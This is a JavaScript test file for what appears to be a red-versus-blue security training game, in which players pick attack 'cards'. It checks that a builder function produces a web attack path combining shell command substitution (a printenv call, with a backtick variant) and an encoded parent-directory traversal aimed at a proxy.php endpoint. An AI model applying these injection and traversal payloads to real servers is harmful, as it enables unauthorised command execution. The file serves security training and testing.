import assert from 'node:assert/strict';
import test from 'node:test';
import { buildAttackPath, taskIdsFor, validateChoice } from '../src/scenario.mjs';

test('intended cards generate the raw/canonical differential request', () => {
  const path = buildAttackPath({
    prefix: 'command_substitution', normalization: 'encoded_parent', sink: 'cold_start', variant: 'original',
  });
  assert.equal(path, '/x$(printenv${IFS}BREACH5_PROOF)x/%2e%2e/apps/builtin-code/proxy.php?status=1');
  assert.match(buildAttackPath({
    prefix: 'command_substitution', normalization: 'encoded_parent', sink: 'cold_start', variant: 'backtick_variant',
  }), /`printenv\$\{IFS\}BREACH5_PROOF`/);
});

test('cards are allowlisted and role-scoped', () => {
  assert.equal(validateChoice('prefix', 'command_substitution'), true);
  assert.equal(validateChoice('prefix', 'arbitrary shell text'), false);
  assert.deepEqual(taskIdsFor({ phase: 'BUILD', team: 'RED', role: 'SCOUT', teamSize: 3 }), ['normalization']);
  assert.deepEqual(taskIdsFor({ phase: 'BUILD', team: 'RED', role: 'BUILDER', teamSize: 3 }), ['prefix']);
  assert.deepEqual(taskIdsFor({ phase: 'BUILD', team: 'RED', role: 'RUNNER', teamSize: 3 }), ['sink']);
  assert.deepEqual(taskIdsFor({ phase: 'BUILD', team: 'RED', role: 'SCOUT', teamSize: 2 }), ['prefix', 'normalization', 'sink']);
});
